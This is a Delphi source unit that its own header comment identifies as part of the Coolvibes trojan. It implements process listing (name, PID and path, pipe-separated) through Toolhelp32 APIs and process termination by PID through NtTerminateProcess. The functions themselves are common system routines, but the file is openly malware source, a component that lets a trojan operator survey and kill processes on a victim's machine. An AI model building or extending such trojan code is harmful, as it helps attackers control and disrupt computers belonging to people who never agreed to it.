{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
relaccionadas con los procesos del sistema}
unit UnitProcess;


interface

uses
ProcessHelp;


const MAX_PATH = 260;
const TH32CS_SNAPPROCESS = $00000002;
const PROCESS_ALL_ACCESS = $001F0FFF;
const STATUS_SUCCESS = $00000000;

type
TPROCESSENTRY32 = packed Record
  dwSize: Cardinal;
  cntUsage: Cardinal;
  th32ProcessId: Cardinal;
  th32DefaultHeapId: LongInt;
  th32ModuleId: Cardinal;
  cntThreads: Cardinal;
  th32ParentProcessId: Cardinal;
  pcPriClassBase: LongInt;
  dwFlags: Cardinal;
  szExeFile: array [0..MAX_PATH - 1] of char;
end;

  function GetProc():String;
  function TerminarProceso(PID: String): Boolean;

implementation

// Declaración de APIS - Updated The Swash
function CreateToolhelp32Snapshot (dwFlags:Cardinal; th32ProcessID: Cardinal) : Cardinal ; stdcall; external 'kernel32.dll' name 'CreateToolhelp32Snapshot';
function Process32First (hSnapshot: Cardinal; var lppe: TProcessEntry32): LongBOOL ; stdcall; external 'kernel32.dll' name 'Process32First';
function Process32Next (hSnapshot: Cardinal; var lpme: TPROCESSENTRY32): LongBOOL ; stdcall; external 'kernel32.dll' name 'Process32Next';
function NtTerminateProcess (dwInHandle: Cardinal;dwExitCode:Cardinal):Cardinal;stdcall;external 'ntdll' name 'NtTerminateProcess';
function OpenProcess (dwDesiredAccess: Cardinal; bInheritHandle: LongBool; dwProcessId: Cardinal):Cardinal;stdcall;external 'kernel32' name 'OpenProcess';
function CloseHandle (hObject:Cardinal):Boolean;stdcall;external 'kernel32' name 'CloseHandle';

function IntToStr(Num: Integer):String;
var x:string;
begin
     System.Str(Num,x);
     result:=x;
end;

function StrToInt(cadena : string) : int64;
var
i : integer;
begin
        result:=0;
        for i:=1 to length(cadena) do
        if cadena[i] in ['0'..'9'] then result:=result*10+ord(cadena[i])-48;
end;

//Procesos +pid separados por |
function GetProc():String;
var
  Proceso : TProcessEntry32;
  ProcessHandle : THandle;
  HayOtroProceso   : Boolean;

begin
  Proceso.dwSize := SizeOf(TProcessEntry32);
  ProcessHandle := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if Process32First(ProcessHandle, Proceso) then  //Si encuentra el primer proceso
  begin
    Result:= String(Proceso.szExeFile) + '|'+ inttoStr(Proceso.th32ProcessID)+'|'+ GetProcessPathById(Proceso.th32ProcessId) + '|';
    repeat HayOtroProceso := Process32Next(ProcessHandle, Proceso);
      if HayOtroProceso then
        Result:= Result + String(Proceso.szExeFile) + '|'+ inttoStr(Proceso.th32ProcessID)+'|'+ GetProcessPathById(Proceso.th32ProcessId) + '|';
    until not HayOtroProceso; //Y esto se repite hasta que Process32Next retorne False
  end;
  CloseHandle(ProcessHandle);
end;

//Cierra el proceso con PID. Si sale bien, devuelve true
function TerminarProceso(PID: String): Boolean;
var                                             
  ProcessHandle : THandle;
  hEnd: Cardinal;
begin
    ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, TRUE, StrToInt(PID));
          hEnd:= NtTerminateProcess(ProcessHandle,0);
          If hEnd <> STATUS_SUCCESS Then
          begin
               Result:= False
          end else
          begin
          Result:= True;
          end;
          CloseHandle(ProcessHandle)
end;

end.
 